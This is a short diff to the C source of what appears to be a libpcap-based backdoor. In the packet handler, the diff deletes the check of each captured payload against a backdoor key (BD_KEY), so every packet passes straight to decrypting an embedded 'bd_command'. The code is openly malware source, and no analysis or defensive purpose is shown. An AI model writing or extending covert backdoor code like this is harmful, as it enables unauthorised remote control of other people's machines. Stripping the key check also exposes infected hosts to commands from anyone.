@@ -370,15 +370,6 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     }
     printf("Payload (len:%zu): %s\n", strlen((char *)packet_info.payload), packet_info.payload);
     
-    /* Check the packet for the key meant for the backdoor */
-    
-    if(strncmp((char *)packet_info.payload, BD_KEY, BD_KEY_LEN) != 0){
-        printf("Not for backdoor, discard.\n");
-        return;
-    }
-    else
-        printf("Got message!\n");
-    
     /* Decrypt remaining packet data */
     
     char *bd_command;
